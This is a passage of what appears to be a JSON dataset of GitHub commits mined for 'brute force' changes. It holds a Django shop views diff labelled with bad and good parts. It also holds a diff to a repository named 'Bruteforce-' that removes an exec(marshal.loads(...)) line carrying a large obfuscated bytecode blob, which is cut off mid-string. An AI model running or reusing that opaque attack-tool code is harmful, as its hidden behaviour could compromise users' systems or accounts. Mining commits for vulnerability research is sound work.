cartqty, \"subtotal\": carttotal})\n         return response\n \n-def cart_update(request):\n-    cart = Cart(request)\n-    if request.POST.get(\"action\") == \"post\":\n-        product_id = int(request.POST.get(\"productid\"))\n-        product_qty = int(request.POST.get(\"productqty\"))\n-        cart.update(product=product_id, qty=product_qty)\n \n-        cartqty = cart.__len__()\n-        cartsubtotal = cart.get_subtotal_price()\n-        response = JsonResponse({\"qty\": cartqty, \"subtotal\": cartsubtotal})\n-        return response\n+def cart_update(request):\n+    if type(int(request.POST.get(\"productqty\"))) is int:\n+        if int(request.POST.get(\"productqty\")) > 0:\n+            cart = Cart(request)\n+            if request.POST.get(\"action\") == \"post\":\n+                product_id = int(request.POST.get(\"productid\"))\n+                product_qty = int(request.POST.get(\"productqty\"))\n+                cart.update(product=product_id, qty=product_qty)\n+                cartqty = cart.__len__()\n+                cartsubtotal = cart.get_subtotal_price()\n+                response = JsonResponse(\n+                    {\"qty\": cartqty, \"subtotal\": cartsubtotal})\n+                return response\n \n # address(c\u00f3 nhi\u1ec1u \u0111\u1ecba ch\u1ec9 c\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c t\u1ea1o)\n+\n+\n @ login_required\n def add_address(request):\n     if request.method == \"POST\":\n","add":30,"remove":20,"filename":"\/DiChoHo\/shop\/views.py","badparts":["    cart = Cart(request)","    if request.POST.get(\"action\") == \"post\":","        product_id = int(request.POST.get(\"productid\"))","        product_qty = int(request.POST.get(\"productqty\"))","        product = get_object_or_404(Product, id=product_id)","        cart.add(product=product, qty=product_qty)","        cartqty = cart.__len__()","        response = JsonResponse({\"qty\": cartqty})","        return response","def cart_update(request):","    cart = Cart(request)","    if request.POST.get(\"action\") == \"post\":","        product_id = int(request.POST.get(\"productid\"))","        product_qty = int(request.POST.get(\"productqty\"))","        cart.update(product=product_id, qty=product_qty)","        cartqty = cart.__len__()","        cartsubtotal = cart.get_subtotal_price()","        response = JsonResponse({\"qty\": cartqty, \"subtotal\": cartsubtotal})","        return response"],"goodparts":["    if type(int(request.POST.get(\"productqty\"))) is int:","        if int(request.POST.get(\"productqty\")) > 0:","            cart = Cart(request)","            if request.POST.get(\"action\") == \"post\":","                product_id = int(request.POST.get(\"productid\"))","                product_qty = int(request.POST.get(\"productqty\"))","                product = get_object_or_404(Product, id=product_id)","                cart.add(product=product, qty=product_qty)","                cartqty = cart.__len__()","                response = JsonResponse({\"qty\": cartqty})","                return response","    else:","        print(type(request.POST.get(\"productqty\")))","def cart_update(request):","    if type(int(request.POST.get(\"productqty\"))) is int:","        if int(request.POST.get(\"productqty\")) > 0:","            cart = Cart(request)","            if request.POST.get(\"action\") == \"post\":","                product_id = int(request.POST.get(\"productid\"))","                product_qty = int(request.POST.get(\"productqty\"))","                cart.update(product=product_id, qty=product_qty)","                cartqty = cart.__len__()","                cartsubtotal = cart.get_subtotal_price()","                response = JsonResponse(","                    {\"qty\": cartqty, \"subtotal\": cartsubtotal})","                return response"]}],"source":"\nfrom django.views.decorators.csrf import csrf_exempt from django.http.response import JsonResponse from django.shortcuts import render, redirect, get_object_or_404 from django.contrib.auth import authenticate, login, logout from django.contrib.auth.forms import UserCreationForm from django.contrib.auth.decorators import login_required from django.http import HttpResponseRedirect from.models import Profile, User, Category, Product, Address, Rating from django.contrib import messages from django.urls import reverse from django.views.decorators.csrf import csrf_exempt from django.template.loader import render_to_string from.cart import Cart from orders.models import Order, OrderItem from django.core.paginator import EmptyPage, Paginator from django.template import RequestContext import django.shortcuts from django.contrib.auth import update_session_auth_hash from django.contrib.auth.forms import PasswordChangeForm from.forms import AddressForm, UserForm, ProfileForm from django.core.mail import EmailMessage from django.conf import settings def handler404(request): response=django.shortcuts.render_to_response('404.html',{}, context_instance=RequestContext(request)) response.status_code=404 return response def index_view(request): products=Product.objects.all().order_by('-sold') products2=Product.objects.all().order_by('-created') products3=Product.objects.all().order_by('price') return render(request, 'index.html',{'products': products, 'products2': products2, 'products3': products3},) def shop_view(request): allProducts=Product.objects.all() p=Paginator(allProducts, 12) currentPage=1 if request.method=='GET' and 'page' in request.GET: currentPage=request.GET.get(\"page\") try: products=p.page(currentPage) except EmptyPage: return redirect('404') return render(request, 'shop.html',{'products': products}) def login_view(request): if request.user.is_authenticated: return redirect('\/') if request.method=='POST': getUsername=request.POST[\"username\"] getPassword=request.POST[\"password\"] user=authenticate(username=getUsername, password=getPassword) if user is not None: login(request, user) return redirect('\/') else: messages.error(request, 'Sai t\u00e0i kho\u1ea3n ho\u1eb7c m\u1eadt kh\u1ea9u') return redirect(reverse('login')) return render(request, 'login.html') def register_view(request): if request.user.is_authenticated: return redirect('\/') if request.method=='POST': username=request.POST['username'] email=request.POST['email'] password=request.POST['password'] password2=request.POST['password2'] name=request.POST['name'] phone=request.POST['phone'] address=request.POST['address'] if password==password2: if User.objects.filter(email=email).exists(): messages.error(request, 'Email Already Used') return redirect('register') elif User.objects.filter(username=username).exists(): messages.error(request, 'Username Already Used') return redirect('register') else: user=User.objects.create_user( username=username, email=email, password=password) user.is_active=True user.first_name=name user.profile.address=address user.profile.phone=phone user.save() send_mail(user) return redirect('home') else: messages.info(request, 'Password is not same') return redirect('register') return render(request, 'register.html') @csrf_exempt def send_mail(uid): template=render_to_string('register_mail.html',{'name': uid.first_name}) email=EmailMessage( 'C\u00e1m \u01a1n b\u1ea1n \u0111\u00e3 \u0111\u0103ng k\u00fd t\u1ea1i trang \u0110i ch\u1ee3 h\u1ed9 c\u1ee7a ch\u00fang t\u00f4i !', template, settings.EMAIL_HOST_USER, [uid.email], ) email.fail_silently=False email.content_subtype='html' email.send() print(email) return redirect('login') def logout_view(request): logout(request) return redirect('\/') def about_view(request): return render( request, 'about.html', ) @login_required def wishlist_view(request): products=Product.objects.filter(users_wishlist=request.user) return render( request, 'wishlist.html', {\"products\": products} ) @login_required def wishlist_add(request): prodid=request.POST.get(\"productid\") product=get_object_or_404(Product, id=prodid) product.users_wishlist.add(request.user) response=JsonResponse({\"Status\": \"OK\"}) return response @login_required def wishlist_delete(request): prodid=request.POST.get(\"productid\") product=get_object_or_404(Product, id=prodid) product.users_wishlist.remove(request.user) response=JsonResponse({\"Status\": \"OK\"}) return response @login_required def profile_view(request): if request.method==\"POST\": form=PasswordChangeForm(request.user, request.POST) if form.is_valid(): user=form.save() update_session_auth_hash(request, user) messages.success(request, \"M\u1eadt kh\u1ea9u \u0111\u01b0\u1ee3c \u0111\u1ed5i th\u00e0nh c\u00f4ng\") return redirect('profile') else: messages.error(request, 'M\u1eadt kh\u1ea9u \u0111\u01b0\u1ee3c \u0111\u1ed5i kh\u00f4ng th\u00e0nh c\u00f4ng') form=PasswordChangeForm(request.user) userid=request.user.id orders=Order.objects.filter(user_id=userid).filter(billing_status=True) user1=get_object_or_404(User, id=userid) profile=get_object_or_404(Profile, id=userid) addresses=Address.objects.filter(user=request.user) ratings=Rating.objects.filter(user=request.user) return render( request, 'profile.html', {'user': user1, 'profile': profile, 'orders': orders, 'form': form, 'addresses': addresses, 'ratings': ratings} ) @login_required def edit_profile(request, id): if request.method==\"POST\": user=User.objects.get(pk=id, username=request.user) user_form=UserForm(instance=user, data=request.POST) profile=Profile.objects.get(pk=id, user=request.user) profile_form=ProfileForm( request.POST, request.FILES, instance=profile) if user_form.is_valid() and profile_form.is_valid(): print(profile_form) print(profile) user_form.save() if Profile.objects.filter(user=request.user).exists()==False: profile_form.save(commit=False) profile_form.user=request.user profile_form.save() return HttpResponseRedirect(reverse(\"profile\")) else: user=User.objects.get(pk=id, username=request.user) user_form=UserForm(instance=user) profile=Profile.objects.get(pk=id, user=request.user) profile_form=ProfileForm(instance=user) return render(request, \"edit_profile.html\",{\"user_form\": user_form, \"profile_form\": profile_form}) def category_list(request, category_slug=None): category=get_object_or_404(Category, slug=category_slug) allFilterProducts=Product.objects.filter(category=category) p=Paginator(allFilterProducts, 12) currentPage=1 if request.method=='GET' and 'page' in request.GET: currentPage=request.GET.get(\"page\") try: products=p.page(currentPage) except EmptyPage: return redirect('404') return render(request, 'category.html',{'category': category, 'products': products}) def product_detail(request, slug): product=get_object_or_404(Product, slug=slug, in_stock=True) all_relative_products=Product.objects.filter(category=product.category) p=Paginator(all_relative_products, 4) relative_products=p.page(1) allRatings=Rating.objects.filter(product=product) count=0 count_stars=0 for rating in allRatings: count +=1 count_stars +=rating.ratingStar average_stars=0 if count > 0: average_stars=count_stars\/count print(average_stars) average_stars_int=int(average_stars) print(average_stars_int) return render(request, 'product-single.html', {'product': product, 'relative_products': relative_products, 'ratings': allRatings, \"rating_count\": count, 'stars': average_stars, 'stars_int': range(average_stars_int), 'unstars_int': range(5 -average_stars_int) }) @login_required def review_add(request): if request.POST.get(\"action\")==\"post\": user_id=request.user.id product_id=int(request.POST.get(\"productid\")) product=get_object_or_404(Product, id=product_id) user=get_object_or_404(User, id=user_id) content=str(request.POST.get(\"content\")) ratingStar=float(request.POST.get(\"star\")) if Rating.objects.filter(product=product_id).exists(): rating=Rating.objects.filter(product=product_id).update( content=content, ratingStar=ratingStar, ) else: rating=Rating.objects.create( user=user, product=product, content=content, ratingStar=ratingStar, ) response=JsonResponse({\"status\": \"OK\"}) return response def cart_view(request): cart=Cart(request) return render(request, \"cart.html\",{\"cart\": cart}) def cart_add(request): cart=Cart(request) if request.POST.get(\"action\")==\"post\": product_id=int(request.POST.get(\"productid\")) product_qty=int(request.POST.get(\"productqty\")) product=get_object_or_404(Product, id=product_id) cart.add(product=product, qty=product_qty) cartqty=cart.__len__() response=JsonResponse({\"qty\": cartqty}) return response def cart_delete(request): cart=Cart(request) if request.POST.get(\"action\")==\"post\": product_id=int(request.POST.get(\"productid\")) cart.delete(product=product_id) cartqty=cart.__len__() carttotal=cart.get_total_price() response=JsonResponse({\"qty\": cartqty, \"subtotal\": carttotal}) return response def cart_update(request): cart=Cart(request) if request.POST.get(\"action\")==\"post\": product_id=int(request.POST.get(\"productid\")) product_qty=int(request.POST.get(\"productqty\")) cart.update(product=product_id, qty=product_qty) cartqty=cart.__len__() cartsubtotal=cart.get_subtotal_price() response=JsonResponse({\"qty\": cartqty, \"subtotal\": cartsubtotal}) return response @ login_required def add_address(request): if request.method==\"POST\": address_form=AddressForm(data=request.POST) if address_form.is_valid(): address_form=address_form.save(commit=False) address_form.user=request.user address_form.save() return HttpResponseRedirect(reverse(\"profile\")) else: address_form=AddressForm() return render(request, \"edit_address.html\",{\"form\": address_form}) @ login_required def edit_address(request, id): if request.method==\"POST\": address=Address.objects.get(pk=id, user=request.user) address_form=AddressForm(instance=address, data=request.POST) if address_form.is_valid(): address_form.save() return HttpResponseRedirect(reverse(\"profile\")) else: address=Address.objects.get(pk=id, user=request.user) address_form=AddressForm(instance=address) return render(request, \"edit_address.html\",{\"form\": address_form}) @ login_required def delete_address(request, id): address=Address.objects.filter(pk=id, user=request.user).delete() return redirect(\"profile\") @ login_required def set_address_default(request, id): Address.objects.filter( user=request.user, default=True).update(default=False) Address.objects.filter(pk=id, user=request.user).update(default=True) previous_url=request.META.get(\"HTTP_REFERER\") if \"delivery_address\" in previous_url: return redirect(\"checkout:delivery_address\") return redirect(\"profile\") def search_views(request): query_item=request.GET.get(\"search\").lower() products=Product.objects.filter(title__icontains=query_item) return render(request, \"search.html\",{'products': products}) def page_not_found(request): return render(request, '404.html') ","sourceWithComments":"from django.views.decorators.csrf import csrf_exempt\nfrom django.http.response import JsonResponse\nfrom django.shortcuts import render, redirect, get_object_or_404\nfrom django.contrib.auth import authenticate, login, logout\nfrom django.contrib.auth.forms import UserCreationForm\nfrom django.contrib.auth.decorators import login_required\nfrom django.http import HttpResponseRedirect\nfrom .models import Profile, User, Category, Product, Address, Rating\nfrom django.contrib import messages\nfrom django.urls import reverse\nfrom django.views.decorators.csrf import csrf_exempt\nfrom django.template.loader import render_to_string\nfrom .cart import Cart\nfrom orders.models import Order, OrderItem\nfrom django.core.paginator import EmptyPage, Paginator\nfrom django.template import RequestContext\nimport django.shortcuts\nfrom django.contrib.auth import update_session_auth_hash\nfrom django.contrib.auth.forms import PasswordChangeForm\nfrom .forms import AddressForm, UserForm, ProfileForm\nfrom django.core.mail import EmailMessage\nfrom django.conf import settings\n\n\ndef handler404(request):\n    response = django.shortcuts.render_to_response('404.html', {}, context_instance=RequestContext(request))\n    response.status_code = 404\n    return response\n\n# get index page\ndef index_view(request):\n    products = Product.objects.all().order_by('-sold')\n    products2 = Product.objects.all().order_by('-created')\n    products3 = Product.objects.all().order_by('price')\n    return render(request, 'index.html', {'products': products, 'products2': products2, 'products3': products3},)\n\n\n# get shop page\ndef shop_view(request):\n    allProducts = Product.objects.all()\n    p = Paginator(allProducts, 12)\n    currentPage = 1\n    if request.method == 'GET' and 'page' in request.GET:\n        currentPage = request.GET.get(\"page\")\n    try:\n        products = p.page(currentPage)\n    except EmptyPage:\n        return redirect('404')\n    return render(request, 'shop.html', {'products': products})\n\n# get login page\ndef login_view(request):\n    if request.user.is_authenticated:\n        return redirect('\/')\n    if request.method == 'POST':\n        getUsername = request.POST[\"username\"]\n        getPassword = request.POST[\"password\"]\n        user = authenticate(username=getUsername,\n                            password=getPassword)\n        if user is not None:\n            login(request, user)\n            return redirect('\/')\n        else:\n            messages.error(request, 'Sai t\u00e0i kho\u1ea3n ho\u1eb7c m\u1eadt kh\u1ea9u')\n            return redirect(reverse('login'))\n    return render(request, 'login.html')\n\n# get register page\ndef register_view(request):\n    if request.user.is_authenticated:\n        return redirect('\/')\n    if request.method == 'POST':\n        username = request.POST['username']\n        email = request.POST['email']\n        password = request.POST['password']\n        password2 = request.POST['password2']\n        name = request.POST['name']\n        phone = request.POST['phone']\n        address = request.POST['address']\n\n        if password == password2:\n            if User.objects.filter(email=email).exists():\n                messages.error(request, 'Email Already Used')\n                return redirect('register')\n            elif User.objects.filter(username=username).exists():\n                messages.error(request, 'Username Already Used')\n                return redirect('register')\n            else:\n                user = User.objects.create_user(\n                    username=username, email=email, password=password)\n                user.is_active = True\n                user.first_name = name\n                user.profile.address = address\n                user.profile.phone = phone\n                user.save()\n                send_mail(user)\n                return redirect('home')\n        else:\n            messages.info(request, 'Password is not same')\n            return redirect('register')\n    return render(request, 'register.html')\n\n# send mail\n@csrf_exempt\ndef send_mail(uid):\n    template = render_to_string('register_mail.html', {'name': uid.first_name})\n    email = EmailMessage(\n        'C\u00e1m \u01a1n b\u1ea1n \u0111\u00e3 \u0111\u0103ng k\u00fd t\u1ea1i trang \u0110i ch\u1ee3 h\u1ed9 c\u1ee7a ch\u00fang t\u00f4i !',\n        template,\n        settings.EMAIL_HOST_USER,\n        [uid.email],\n    )\n\n    email.fail_silently = False\n    email.content_subtype = 'html'\n    email.send()\n    print(email)\n    return redirect('login')\n\n\ndef logout_view(request):\n    logout(request)\n    return redirect('\/')\n\n# get about page\ndef about_view(request):\n    return render(\n        request,\n        'about.html',\n    )\n\n# get wishlist page\n@login_required\ndef wishlist_view(request):\n    products = Product.objects.filter(users_wishlist=request.user)\n    return render(\n        request,\n        'wishlist.html',\n        {\"products\": products}\n    )\n\n@login_required\ndef wishlist_add(request):\n    prodid = request.POST.get(\"productid\")\n    product = get_object_or_404(Product, id=prodid)\n    product.users_wishlist.add(request.user)\n    response = JsonResponse({\"Status\": \"OK\"})\n    return response\n\n@login_required\ndef wishlist_delete(request):\n    prodid = request.POST.get(\"productid\")\n    product = get_object_or_404(Product, id=prodid)\n    product.users_wishlist.remove(request.user)\n    response = JsonResponse({\"Status\": \"OK\"})\n    return response\n\n# profile\n@login_required\ndef profile_view(request):\n    if request.method == \"POST\":\n        form = PasswordChangeForm(request.user, request.POST)\n        if form.is_valid():\n            user = form.save()\n            update_session_auth_hash(request, user)\n            messages.success(request, \"M\u1eadt kh\u1ea9u \u0111\u01b0\u1ee3c \u0111\u1ed5i th\u00e0nh c\u00f4ng\")\n            return redirect('profile')\n        else:\n            messages.error(request, 'M\u1eadt kh\u1ea9u \u0111\u01b0\u1ee3c \u0111\u1ed5i kh\u00f4ng th\u00e0nh c\u00f4ng')\n\n    form = PasswordChangeForm(request.user)\n    userid = request.user.id\n    orders = Order.objects.filter(user_id=userid).filter(billing_status=True)\n    user1 = get_object_or_404(User, id=userid)\n    profile = get_object_or_404(Profile, id=userid)\n    addresses = Address.objects.filter(user=request.user)\n    ratings = Rating.objects.filter(user=request.user)\n    return render(\n        request,\n        'profile.html',\n        {'user': user1, 'profile': profile, 'orders': orders,\n            'form': form, 'addresses': addresses, 'ratings': ratings}\n    )\n\n@login_required\ndef edit_profile(request, id):\n    if request.method == \"POST\":\n        user = User.objects.get(pk=id, username=request.user)\n        user_form = UserForm(instance=user, data=request.POST)\n        profile = Profile.objects.get(pk=id, user=request.user)\n        profile_form = ProfileForm(\n            request.POST, request.FILES, instance=profile)\n        if user_form.is_valid() and profile_form.is_valid():\n            print(profile_form)\n            print(profile)\n            user_form.save()\n\n            if Profile.objects.filter(user=request.user).exists() == False:\n                profile_form.save(commit=False)\n                profile_form.user = request.user\n            profile_form.save()\n            return HttpResponseRedirect(reverse(\"profile\"))\n\n    else:\n        user = User.objects.get(pk=id, username=request.user)\n        user_form = UserForm(instance=user)\n        profile = Profile.objects.get(pk=id, user=request.user)\n        profile_form = ProfileForm(instance=user)\n    return render(request, \"edit_profile.html\", {\"user_form\": user_form, \"profile_form\": profile_form})\n\n# view category, product\ndef category_list(request, category_slug=None):\n    category = get_object_or_404(Category, slug=category_slug)\n    allFilterProducts = Product.objects.filter(category=category)\n    p = Paginator(allFilterProducts, 12)\n    currentPage = 1\n    if request.method == 'GET' and 'page' in request.GET:\n        currentPage = request.GET.get(\"page\")\n    try:\n        products = p.page(currentPage)\n    except EmptyPage:\n        return redirect('404')\n    return render(request, 'category.html', {'category': category, 'products': products})\n\n\ndef product_detail(request, slug):\n    product = get_object_or_404(Product, slug=slug, in_stock=True)\n    all_relative_products = Product.objects.filter(category=product.category)\n    p = Paginator(all_relative_products, 4)\n    relative_products = p.page(1)\n    allRatings = Rating.objects.filter(product=product)\n    count = 0\n    count_stars = 0\n    for rating in allRatings:\n        count += 1\n        count_stars += rating.ratingStar\n    average_stars = 0\n    if count > 0:\n        average_stars = count_stars\/count\n\n    print(average_stars)\n    average_stars_int = int(average_stars)\n    print(average_stars_int)\n    return render(request, 'product-single.html', \n                    {'product': product, 'relative_products': relative_products, \n                    'ratings': allRatings, \"rating_count\": count, \n                    'stars': average_stars, 'stars_int': range(average_stars_int), \n                    'unstars_int': range(5 - average_stars_int)\n                    })\n\n\n#review\n@login_required\ndef review_add(request):\n    # if request.method == \"POST\":\n    if request.POST.get(\"action\") == \"post\":\n        user_id = request.user.id\n        product_id = int(request.POST.get(\"productid\"))\n        product = get_object_or_404(Product, id=product_id)\n        user = get_object_or_404(User, id=user_id)\n        content = str(request.POST.get(\"content\"))\n        ratingStar = float(request.POST.get(\"star\"))\n\n        \n        if Rating.objects.filter(product=product_id).exists():\n            rating = Rating.objects.filter(product=product_id).update(\n                content=content,\n                ratingStar=ratingStar,\n            )\n            \n        else:\n            rating = Rating.objects.create(\n                user=user,\n                product=product,\n                content=content,\n                ratingStar=ratingStar,\n            )\n        response = JsonResponse({\"status\": \"OK\"})\n        return response\n\n\n#  cart\n\ndef cart_view(request):\n    cart = Cart(request)\n    return render(request, \"cart.html\", {\"cart\": cart})\n\ndef cart_add(request):\n    cart = Cart(request)\n    if request.POST.get(\"action\") == \"post\":\n        product_id = int(request.POST.get(\"productid\"))\n        product_qty = int(request.POST.get(\"productqty\"))\n        product = get_object_or_404(Product, id=product_id)\n        cart.add(product=product, qty=product_qty)\n        cartqty = cart.__len__()\n        response = JsonResponse({\"qty\": cartqty})\n        return response\n\ndef cart_delete(request):\n    cart = Cart(request)\n    if request.POST.get(\"action\") == \"post\":\n        product_id = int(request.POST.get(\"productid\"))\n        cart.delete(product=product_id)\n\n        cartqty = cart.__len__()\n        carttotal = cart.get_total_price()\n        response = JsonResponse({\"qty\": cartqty, \"subtotal\": carttotal})\n        return response\n\ndef cart_update(request):\n    cart = Cart(request)\n    if request.POST.get(\"action\") == \"post\":\n        product_id = int(request.POST.get(\"productid\"))\n        product_qty = int(request.POST.get(\"productqty\"))\n        cart.update(product=product_id, qty=product_qty)\n\n        cartqty = cart.__len__()\n        cartsubtotal = cart.get_subtotal_price()\n        response = JsonResponse({\"qty\": cartqty, \"subtotal\": cartsubtotal})\n        return response\n\n# address(c\u00f3 nhi\u1ec1u \u0111\u1ecba ch\u1ec9 c\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c t\u1ea1o)\n@ login_required\ndef add_address(request):\n    if request.method == \"POST\":\n        address_form = AddressForm(data=request.POST)\n        if address_form.is_valid():\n            address_form = address_form.save(commit=False)\n            address_form.user = request.user\n            address_form.save()\n            return HttpResponseRedirect(reverse(\"profile\"))\n    else:\n        address_form = AddressForm()\n    return render(request, \"edit_address.html\", {\"form\": address_form})\n\n@ login_required\ndef edit_address(request, id):\n    if request.method == \"POST\":\n        address = Address.objects.get(pk=id, user=request.user)\n        address_form = AddressForm(instance=address, data=request.POST)\n        if address_form.is_valid():\n            address_form.save()\n            return HttpResponseRedirect(reverse(\"profile\"))\n    else:\n        address = Address.objects.get(pk=id, user=request.user)\n        address_form = AddressForm(instance=address)\n    return render(request, \"edit_address.html\", {\"form\": address_form})\n\n@ login_required\ndef delete_address(request, id):\n    address = Address.objects.filter(pk=id, user=request.user).delete()\n    return redirect(\"profile\")\n\n@ login_required\ndef set_address_default(request, id):\n    Address.objects.filter(\n        user=request.user, default=True).update(default=False)\n    Address.objects.filter(pk=id, user=request.user).update(default=True)\n    previous_url = request.META.get(\"HTTP_REFERER\")\n\n    if \"delivery_address\" in previous_url:\n        return redirect(\"checkout:delivery_address\")\n\n    return redirect(\"profile\")\n\n# search\ndef search_views(request):\n    query_item = request.GET.get(\"search\").lower()\n    products = Product.objects.filter(title__icontains=query_item)\n    return render(request, \"search.html\", {'products': products})\n\n\ndef page_not_found(request):\n    return render(request, '404.html')\n"}},"msg":"Update prevent login brute-force function"}},"https:\/\/github.com\/Noob-Hacker71\/Bruteforce-":{"f92300442d28e2e785dd745064da2a37fbeb8e9c":{"url":"https:\/\/api.github.com\/repos\/Noob-Hacker71\/Bruteforce-\/commits\/f92300442d28e2e785dd745064da2a37fbeb8e9c","html_url":"https:\/\/github.com\/Noob-Hacker71\/Bruteforce-\/commit\/f92300442d28e2e785dd745064da2a37fbeb8e9c","message":"Update brute-force.py","sha":"f92300442d28e2e785dd745064da2a37fbeb8e9c","keyword":"brute force update","diff":"diff --git a\/brute-force.py b\/brute-force.py\nindex 796f734..c86e449 100644\n--- a\/brute-force.py\n+++ b\/brute-force.py\n@@ -1,3 +1,3 @@\n import marshal\n-#https:\/\/youtube.com\/NjankSoekamti\n-exec(marshal.loads('c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x0e\\x15\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x80\\x14\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00@\\x00\\x00\\x00s\\xfc\\x03\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x01\\x00Z\\x01\\x00d\\x00\\x00d\\x01\\x00l\\x02\\x00Z\\x02\\x00d\\x00\\x00d\\x01\\x00l\\x03\\x00Z\\x03\\x00d\\x00\\x00d\\x01\\x00l\\x04\\x00Z\\x04\\x00y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x05\\x00Z\\x05\\x00Wn\\x1e\\x00\\x04e\\x06\\x00k\\n\\x00rl\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x02\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xe\\x00\\x00j\\x07\\x00d\\x03\\x00\\x83\\x01\\x00\\x01y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00Wn*\\x00\\x04e\\x06\\x00k\\n\\x00r\\xb6\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x04\\x00\\x83\\x01\\x00\\x01d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00n\\x01\\x00Xd\\x00\\x00d\\x05\\x00l\\t\\x00m\\n\\x00Z\\n\\x00\\x01d\\x00\\x00d\\x06\\x00l\\x08\\x00m\\x0b\\x00Z\\x0b\\x00\\x01d\\x07\\x00\\x84\\x00\\x00Z\\x0c\\x00e\\x08\\x00j\\x0b\\x00\\x83\\x00\\x00Z\\r\\x00e\\r\\x00j\\x0e\\x00e\\x0f\\x00\\x83\\x01\\x00\\x01e\\r\\x00j\\x10\\x00e\\x08\\x00j\\x11\\x00j\\x12\\x00\\x83\\x00\\x00d\\x08\\x00d\\t\\x00\\x83\\x01\\x01\\x01d2\\x00g\\x01\\x00e\\r\\x00_\\x13\\x00e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00d\\r\\x00\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d\\x0e\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x05\\x00j\\x15\\x00\\x83\\x00\\x00Z\\x16\\x00e\\x16\\x00j\\x17\\x00Z\\x18\\x00e\\x18\\x00d\\x0f\\x00\\x83\\x01\\x00j\\x19\\x00Z\\x1a\\x00e\\x1a\\x00d\\x01\\x00\\x04Ug\\x00\\x00Z\\x1b\\x00d\\x10\\x00Z\\x1c\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x1a\\x00j&\\x00d\\x1b\\x00e \\x00d\\x1c\\x00e\\x1d\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00d\\x1f\\x00e\\x1f\\x00\\x83\\x00\\x05Z\\'\\x00d \\x00j&\\x00d\\x1c\\x00e\\x1d\\x00d\\x1f\\x00e\\x1f\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00\\x83\\x00\\x04Z(\\x00e)\\x00d!\\x00k\\x02\\x00rS\\x02n\/\\x00e\\x0c\\x00e\"\\x00d\"\\x00\\x17\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d#\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d$\\x00\\x83\\x01\\x00\\x01e*\\x00\\x83\\x00\\x00\\x01x\\xb2\\x00e+\\x00r6\\x03e\\x00\\x00j\\x07\\x00d%\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00e\\'\\x00\\x83\\x01\\x00\\x01e,\\x00e \\x00d&\\x00\\x17\\x83\\x01\\x00Z-\\x00e-\\x00e.\\x00k\\x02\\x00r\\x18\\x03e\\x0c\\x00e\\x1e\\x00d\\'\\x00\\x17\\x83\\x01\\x00\\x01e,\\x00e\\x1f\\x00d(\\x00\\x17\\x83\\x01\\x00Z\/\\x00e\/\\x00e0\\x00k\\x02\\x00r\\xfa\\x02e\\x0c\\x00e\\x1e\\x00d)\\x00\\x17\\x83\\x01\\x00\\x01Pq3\\x03e\\x0c\\x00e\\x1d\\x00d*\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02e\\x0c\\x00e\\x1d\\x00d+\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02We\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e1\\x00GHe\\x0c\\x00e(\\x00\\x83\\x01\\x00\\x01e,\\x00e\"\\x00d,\\x00\\x17\\x83\\x01\\x00Z2\\x00e,\\x00e 